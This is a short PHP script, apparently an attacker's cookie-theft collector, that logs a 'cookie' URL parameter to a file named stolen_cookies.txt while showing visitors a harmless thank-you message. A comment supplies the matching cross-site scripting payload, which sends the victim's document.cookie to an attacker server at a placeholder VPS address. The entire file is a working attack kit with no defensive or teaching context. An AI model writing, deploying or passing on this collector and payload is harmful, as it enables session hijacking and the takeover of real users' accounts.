<?php
// Log the stolen cookie
$cookie = $_GET['cookie'];
$fp = fopen('stolen_cookies.txt', 'a');
fwrite($fp, $cookie . "\n");
fclose($fp);

echo "Thank you for visiting!";

?>

// xxs execution
// < script>document.location='http://your_vps_ip/attacker/steal.php?cookie='+document.cookie;< /script>

